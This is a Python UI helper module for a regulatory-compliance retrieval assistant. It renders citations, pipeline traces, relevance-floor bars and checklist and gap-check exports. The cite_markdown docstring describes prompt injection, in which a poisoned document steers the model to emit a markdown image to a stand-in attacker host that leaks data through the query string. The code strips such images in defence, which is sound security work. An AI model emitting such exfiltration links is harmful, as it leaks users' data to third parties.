"""Pure presentation logic for the UI: all wording lives here, no Streamlit imports.

Design motif: the *relevance floor*.  Every passage the retriever returns has a
cosine score; passages under the floor are never shown to the model, and when
none clear it the system abstains instead of generating.  The UI draws that line.
"""
from __future__ import annotations

import csv
import html
import io
import re
from typing import Any, Dict, List, Optional, Tuple

_CITE_RE = re.compile(r"\[(\d+)\](?!\()")
_IMAGE_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
# A sentence ends at . ! ? (plus any [n] after it) when the next word does not start with a digit or lowercase
# letter, so "Art. 33(3)" and "e.g. the" stay inside their sentence.
_SENTENCE_END_RE = re.compile(r"[.!?](?:\s*\[\d+\])*(?=\s*$|\s+[^a-z0-9\s])")

EXAMPLES = [
    "What is retrieval-augmented generation and how does it work?",
    "How does zero-shot question generation improve passage retrieval?",
    "What are the I/O bottlenecks in approximate nearest neighbor search on SSDs?",
    "Who won the 2018 FIFA World Cup?",
]

# Regulatory knowledge base (namespace regs-v1): official EU and NIST text, with dates.
REGS_NAMESPACE = "regs-v1"
FRAMEWORKS = ["EU AI Act", "GDPR", "NIS2", "DORA", "Cyber Resilience Act", "NIST SP 800-53", "NIST CSF 2.0",
              "NIST AI RMF"]
REGS_EXAMPLES = [
    "When must a personal data breach be reported?",
    "Do the AI Act's high-risk obligations already apply to a CV-screening tool?",
    "What are the incident reporting deadlines across EU rules?",
    "What does HIPAA require?",
]
HIGH_RISK = {"Not sure": None, "Annex III (e.g. hiring, credit, education)": "annex_iii",
             "Annex I (safety component of a regulated product)": "annex_i", "Not high-risk": "none"}

_ROLE_WORDS = {"annex_iii": "Annex III", "annex_i": "Annex I", "none": "not high-risk", "unknown": "high-risk unknown"}
_ROUTE_REPLY = {
    "out_of_scope": "The question names rules this knowledge base does not cover, so nothing was searched",
    "licensed": "The question names a licensed standard, whose text is not in the public knowledge base",
    "not_available": "Recognised a request for a {intent}, which is not available yet",
    "clarify": "The request needs more detail before anything can be looked up",
}
_ABSTAIN_VERDICT = {
    "out_of_scope": ("gray", "Not covered here"),
    "licensed": ("gray", "Licensed standard"),
    "not_available": ("blue", "Not available yet"),
    "clarify": ("blue", "Needs more detail"),
}

_REJECTED = {
    "refusal": "it was a refusal",
    "answer": "it answered instead of searching",
    "new_facts": "it added facts that were not in the question",
    "empty": "it was empty",
}

PALETTE = {
    False: {"keep": "#2E6B5B", "drop": "#B9C2BB", "floor": "#C9661E", "track": "#E8EDE7", "text": "#17202A"},
    True: {"keep": "#6DB89E", "drop": "#3A4650", "floor": "#E8913F", "track": "#1A2229", "text": "#E4EAE5"},
}


def _ms(ms: Optional[float]) -> str:
    return f" · `{ms:,.0f} ms`" if ms else ""


def cite_markdown(answer: str, n_sources: int) -> str:
    """Render [n] citations as badges; flag the ones that point at no source.

    Markdown images are removed first: a poisoned document can steer the model into
    emitting ![](https://attacker/?q=...), which every viewer's browser would fetch.
    """
    answer = _IMAGE_RE.sub("(image removed)", answer)

    def badge(m: re.Match) -> str:
        n = int(m.group(1))
        return f":green-badge[{n}]" if 1 <= n <= n_sources else f":orange-badge[{n} · no source]"
    return _CITE_RE.sub(badge, answer)


def citing_sentences(answer: str, n: int) -> List[str]:
    """Sentences carrying [n]. A marker written after the full stop ('... persons. [1]') belongs to that sentence."""
    out: List[str] = []
    for line in answer.splitlines():
        start = 0
        for m in _SENTENCE_END_RE.finditer(line):
            out.append(line[start:m.end()])
            start = m.end()
        out.append(line[start:])
    return [s.strip() for s in out if f"[{n}]" in s]


def step_line(step: Dict[str, Any]) -> str:
    """One line of the pipeline trace, in plain language."""
    sid, status, d, ms = step["id"], step["status"], step.get("detail") or {}, step.get("ms")
    if sid == "route":
        reason = d.get("abstain_reason")
        if reason in _ROUTE_REPLY:
            return _ROUTE_REPLY[reason].format(intent=str(d.get("intent") or "").replace("_", " "))
        noted = profile_words(d.get("profile_updates") or {})
        tail = f" · noted: {noted}" if noted else ""
        if d.get("intent") == "checklist":
            return "Recognised a checklist request; built it from the rules table" + tail
        return "Understood as a question about the rules" + tail
    if sid == "retrieve":
        line = f"Retrieved {d.get('hits', 0)} passages · best match `{d.get('top_score', 0.0):.2f}`"
        if d.get("rewritten_query"):
            line += f" · searched for “{d['rewritten_query']}”"
        return line + _ms(ms)
    if sid == "correct":
        action = str(d.get("action") or "")
        if action == "skipped:instruction_override":
            return "Skipped query rewriting: the question reads like an instruction, not a search"
        if action.startswith("rewrite_rejected:"):
            why = _REJECTED.get(action.split(":", 1)[1], "it was not a search query")
            return f"Kept the original question: the suggested rewrite was discarded because {why}"
        return f"Weak match, so the question was rewritten and searched again ({d.get('iterations', 0)}×)"
    if sid == "web":
        return f"Searched the web · {d.get('results', 0)} results" + _ms(ms)
    if sid == "gate":
        floor, scores = d.get("floor", 0.0), d.get("scores") or []
        if d.get("abstain"):
            return (f"Nothing cleared the relevance floor `{floor:.2f}`, "
                    "so no answer was generated")
        web = f" + {d['web']} web results" if d.get("web") else ""
        return f"{d.get('kept', 0)} of {len(scores)} passages cleared the relevance floor `{floor:.2f}`{web}"
    if sid == "generate":
        if status == "skipped":
            return ""  # the gate line already says why nothing was generated
        return ":shimmer[Writing the answer…]" if status == "running" else ("Wrote the answer" + _ms(ms))
    if sid == "verify":
        dangling = d.get("dangling") or []
        tail = f" · {len(dangling)} citation(s) point at no source" if dangling else ""
        if d.get("grounded") is True:
            return f"Checked against the passages: grounded `{d.get('faithfulness_score') or 0:.2f}`{tail}" + _ms(ms)
        if d.get("grounded") is False:
            return f"Checked against the passages: **not supported**{tail}" + _ms(ms)
        return f"Citations checked{tail} · grounding judge is off on this server"
    return sid


def profile_words(profile: Dict[str, Any], facts: Optional[List[Dict[str, Any]]] = None) -> str:
    """'AI deployer, Annex III high-risk, EU market' from a profile; facts.yaml labels when given."""
    by_id = {f["id"]: f for f in facts or []}
    words: List[str] = []
    for key, value in profile.items():
        f = by_id.get(key, {})
        labels = f.get("labels") or {}

        if value is True:
            words.append(f.get("short") or key.replace("_", " "))
        elif isinstance(value, list):
            words += [labels.get(v) or str(v).replace("_", " ") for v in value]
        elif value not in (False, None, ""):
            # Without facts.yaml labels a bare value ("none", "small") is ambiguous: name the fact too.
            words.append(labels.get(value) or (_ROLE_WORDS.get(value) if key == "high_risk" else None)
                         or f"{key.replace('_', ' ')}: {str(value).replace('_', ' ')}")
    return ", ".join(words)


def status_label(src: Dict[str, Any]) -> Optional[Tuple[str, str]]:
    """(badge color, text) for a provision's applicability on the as-of date; None outside the regs corpus."""
    st, frm = src.get("status"), src.get("applies_from")
    if not st:
        return None
    return {
        "applies": ("green", f"in force since {frm}"),
        "not_yet": ("orange", f"applies from {frm}"),
        "partly": ("orange", f"partly from {frm}"),
        "depends": ("violet", "date depends on classification"),
        "voluntary": ("gray", "voluntary framework"),
        "licensed_copy": ("blue", "your copy"),
    }.get(st, ("gray", "no date of its own"))


def dates_note(note: str) -> str:
    """'2027-12-02 if annex_iii; 2028-08-02 if annex_i' -> readable class names."""
    return re.sub(r"\bif (annex_iii|annex_i)\b", lambda m: f"for {_ROLE_WORDS[m.group(1)]} systems", note)


CROSSWALK_CAVEAT = ("Matches come from published mappings and show related requirements, not equivalence. "
                    "Community mappings are not endorsed by NIST.")


def crosswalk_lines(xw: Optional[Dict[str, Any]], standards: Optional[Dict[str, Any]] = None
                    ) -> List[Tuple[str, List[Tuple[str, str, str]], int]]:
    """[(group, [(ref, badge color, caption)], hidden count)] in first-seen group order. With the user's own
    licensed copies (`standards`), ISO matches say which clause of their copy they point to."""
    groups: Dict[str, List[Tuple[str, str, str]]] = {}
    for m in (xw or {}).get("items") or []:
        notes = [m["source_title"]]
        if m.get("via"):
            notes.append("via " + " → ".join(m["via"]))
        if m.get("note"):
            notes.append(m["note"])
        if m["kind"] == "community":
            notes.append("community mapping, not endorsed by NIST")
        if m.get("licensed"):
            clause = copy_clause(m["id"], standards)
            notes.append(f"from your copy: {clause['title']}" if clause else "licensed text, bring your copy")
        label = m["ref"] + (f" · {m['title']}" if m.get("title") else "")
        groups.setdefault(m["group"], []).append((label, "green" if m["kind"] == "official" else "gray", " · ".join(notes)))
    more = (xw or {}).get("more") or {}
    return [(g, lines, more.get(g, 0)) for g, lines in groups.items()]


def _short_ref(ref: str, group: str) -> str:
    """'SP 800-53 PM-30' under 'NIST SP 800-53' -> 'PM-30': the group heading already names the framework."""
    words, known, i = ref.split(" "), set(group.split(" ")), 0
    while i < len(words) - 1 and words[i] in known:
        i += 1
    return " ".join(words[i:])


def crosswalk_compact(xw: Optional[Dict[str, Any]], standards: Optional[Dict[str, Any]] = None,
                      inline: int = 3) -> List[Dict[str, Any]]:
    """Per group: the first `inline` refs as badges on one line, their mapping sources, and the remaining lines."""
    out = []
    for group, lines, hidden in crosswalk_lines(xw, standards):
        top = lines[:inline]
        out.append({"group": group,
                    "line": " ".join(f":{color}-badge[{esc(_short_ref(label.split(' · ')[0], group))}]"
                                     for label, color, _ in top),
                    "notes": " · ".join(dict.fromkeys(note for _, _, note in top)),
                    "rest": lines[inline:], "hidden": hidden})
    return out


def chip_label(n: int, src: Dict[str, Any]) -> str:
    if src.get("via"):
        return f"{n} · {src['ref']} · via {src['via']['ref']}"
    label = status_label(src)
    if src.get("ref") and label:
        return f"{n} · {src['ref']} · {label[1]}"
    title = (src.get("title") or f"Source {n}")[:42]
    score = "web" if src.get("source") == "web" else f"{float(src.get('score') or 0):.2f}"
    return f"{n} · {title} · {score}"


def trace_summary(abstained: bool, total_ms: float, n_sources: int, reason: Optional[str] = None,
                  intent: Optional[str] = None) -> str:
    secs = f"{total_ms / 1000:.1f} s"
    if intent == "checklist":
        return f"Checklist built in {secs}"
    if abstained and reason in ("out_of_scope", "licensed"):
        return f"Declined in {secs} · outside the covered rules"
    if abstained and reason in ("not_available", "clarify"):
        return f"Replied in {secs} · nothing was searched"
    if abstained:
        return f"Abstained in {secs} · nothing relevant enough in the knowledge base"
    return f"Answered in {secs} · {n_sources} source{'s' if n_sources != 1 else ''}"


def verdict(response: Dict[str, Any]) -> Tuple[str, str]:
    """(badge color, label) for the answer's trust state."""
    if response.get("checklist"):
        return "blue", "From the rules table, no model"
    if response.get("insufficient_context"):
        return _ABSTAIN_VERDICT.get(response.get("abstain_reason"), ("orange", "Not in the knowledge base"))
    grounded, score = response.get("grounded"), response.get("faithfulness_score")
    if grounded is True:
        return "green", f"Grounded · {score:.2f}" if score is not None else "Grounded"
    if grounded is False:
        return "red", f"Not supported by sources · {score:.2f}" if score is not None else "Not supported by sources"
    return "gray", "Grounding not checked"


def floor_bars_html(scores: List[float], floor: float, dark: bool) -> str:
    """Every candidate passage as a bar against the relevance floor (the signature view)."""
    c = PALETTE[dark]
    top = max([*scores, floor * 2, 0.5]) * 1.08
    rows = []
    for i, s in enumerate(scores, 1):
        kept = s >= floor
        rows.append(
            f'<div data-kept="{str(kept).lower()}" style="display:flex;align-items:center;gap:8px;margin:3px 0">'
            f'<span style="width:1.4em;text-align:right;opacity:.7">{i}</span>'
            f'<div style="position:relative;flex:1;height:10px;background:{c["track"]};border-radius:5px">'
            f'<div style="width:{s / top * 100:.1f}%;height:100%;border-radius:5px;'
            f'background:{c["keep"] if kept else c["drop"]}"></div>'
            f'<div style="position:absolute;left:{floor / top * 100:.1f}%;top:-3px;bottom:-3px;width:2px;'
            f'background:{c["floor"]}"></div></div>'
            f'<span style="width:3.2em;text-align:right">{s:.2f}</span></div>'
        )
    return (
        f'<div style="font-family:\'Martian Mono\',monospace;font-size:11px;color:{c["text"]}">'
        + "".join(rows)
        + f'<div style="margin-top:4px;color:{c["floor"]}">│ relevance floor {floor:.2f}</div></div>'
    )


def esc(text: str) -> str:
    return html.escape(text or "")


# ---------------------------------------------------------------------------
# Checklist export (sub-project 3)
# ---------------------------------------------------------------------------

GROUP_TITLES = [("now", "Applies now"), ("coming", "Coming"), ("depends", "Depends on your answers")]


def _item_line(it: Dict[str, Any]) -> str:
    label = status_label(it)
    dep = f" (depends on: {', '.join(d.replace('_', ' ') for d in it['depends_on'])})" if it.get("depends_on") else ""
    return f"- [ ] **{it['ref']}** {it['title']}" + (f" — {label[1]}" if label else "") + dep


def checklist_markdown(cl: Dict[str, Any], facts: Optional[List[Dict[str, Any]]] = None) -> str:
    lines = [f"# Compliance checklist (as of {cl['as_of']})", "",
             f"Profile: {profile_words(cl['profile'], facts) or 'nothing given yet'}", "",
             "Information from official EU text, not legal advice.", ""]
    for key, title in GROUP_TITLES:
        if cl["groups"][key]:
            lines += [f"## {title}", ""] + [_item_line(it) for it in cl["groups"][key]] + [""]
    for pr in cl.get("practices") or []:
        lines += [f"## Recommended practices (voluntary): {pr['framework']}", ""]
        lines += [f"- {i['ref']}: {i['title']}" for g in pr["groups"] for i in g["items"]] + [""]
    return "\n".join(lines)


def checklist_csv(cl: Dict[str, Any]) -> str:
    out = io.StringIO()
    w = csv.writer(out)
    w.writerow(["group", "framework", "article", "ref", "title", "status", "applies_from", "depends_on", "note"])
    for key, title in GROUP_TITLES:
        for it in cl["groups"][key]:
            w.writerow([title, it["framework"], it["article"], it["ref"], it["title"], it.get("status") or "",
                        it.get("applies_from") or "", " ".join(it.get("depends_on") or []), it.get("note") or ""])
    return out.getvalue()


VERDICT_LABELS = {"covered": ("green", "covered"), "partial": ("orange", "partial"), "missing": ("red", "missing"),
                  "unverified": ("gray", "unverified, review")}
_COPY_KEYS = {"iso-27001": "iso-27001", "iso-42001-fdis": "iso-42001"}


def verdict_label(verdict: str) -> Tuple[str, str]:
    return VERDICT_LABELS.get(verdict, ("gray", verdict))


def gap_options(cl: Dict[str, Any]) -> Tuple[Dict[str, str], List[str]]:
    """Every checklist article (and annex section) a gap check can test, with the binding ones preselected.
    Articles that depend on unanswered facts stay selectable, so a check never needs a finished profile."""
    opts: Dict[str, str] = {}
    for g in ("now", "coming", "depends"):
        tail = " · depends on your answers" if g == "depends" else ""
        for it in cl["groups"][g]:
            opts[it["article"]] = f"{it['ref']} · {it['title']}{tail}"
            sections = sorted({p["id"].split("pt-")[1].split(".")[0] for p in it["paragraphs"] if "/pt-" in p["id"]},
                              key=int)
            for sec in sections:
                key = f"{it['paragraphs'][-1]['id'].split('/pt-')[0]}#{sec}"
                opts[key] = f"{it['ref'].split(' Art.')[0]} Annex, section {sec}{tail}"
    binding = [it["article"] for g in ("now", "coming") for it in cl["groups"][g]]
    return opts, binding[:6]


# Text limits are the API's (backend/app/schemas/workspace.py); file sizes only stop absurd uploads early.
POLICY_CHARS, STANDARD_CHARS = 200_000, 1_000_000
UPLOAD_MB = {"policy": 10, "standard": 25}


def text_limit_error(kind: str, chars: int) -> Optional[str]:
    limit = POLICY_CHARS if kind == "policy" else STANDARD_CHARS
    if chars <= limit:
        return None
    if kind == "policy":
        return (f"This policy has {chars:,} characters of text; the limit is {limit:,}. "
                "Split it, or load only the part you want checked.")
    return f"This copy has {chars:,} characters of text; the limit is {limit:,}."


def copy_clause(match_id: str, standards: Optional[Dict[str, Any]]) -> Optional[Dict[str, str]]:
    prefix, _, cid = match_id.partition("/")
    std = (standards or {}).get(_COPY_KEYS.get(prefix, ""))
    return ((std or {}).get("clauses") or {}).get(cid)


def _duty_line(d: Dict[str, Any]) -> str:
    label = verdict_label(d["verdict"])[1]
    if d["verdict"] == "unverified" and d.get("claimed"):
        label += f" (claimed {d['claimed']}: {d['problem']})"
    elif d["verdict"] == "unverified":
        label += f" ({d['problem']})"
    quotes = [f"law: “{d['law_quote']}”"] if d.get("law_quote") else []
    if d.get("policy_quote") and d["verdict"] != "unverified":
        quotes.append(f"policy {d['passage_id']}: “{d['policy_quote']}”")
    reason = f" {d['reason']}" if d.get("reason") else ""
    return f"- **{d['ref']}** {label}:{reason}" + (f" ({'; '.join(quotes)})" if quotes else "")


def gap_markdown(results: List[Dict[str, Any]], summary: Dict[str, Any], policy_title: str) -> str:
    lines = [f"# Gap check: {policy_title}", "",
             " · ".join(f"{summary.get(v, 0)} {verdict_label(v)[1]}" for v in VERDICT_LABELS), "",
             "Advisory review from published law texts; verdicts come from a model and every quote was checked "
             "word for word. Information, not legal advice.", ""]
    for r in results:
        lines += [f"## {r['ref']} {r['title']}".rstrip(), ""] + [_duty_line(d) for d in r["duties"]] + [""]
    return "\n".join(lines)


def gap_csv(results: List[Dict[str, Any]]) -> str:
    out = io.StringIO()
    w = csv.writer(out)
    w.writerow(["article", "duty", "verdict", "claimed", "law_quote", "policy_quote", "passage", "reason", "problem"])
    for r in results:
        for d in r["duties"]:
            w.writerow([r["ref"], d["ref"], d["verdict"], d.get("claimed") or "", d.get("law_quote", ""),
                        d.get("policy_quote", ""), d.get("passage_id", ""), d.get("reason", ""), d.get("problem", "")])
    return out.getvalue()
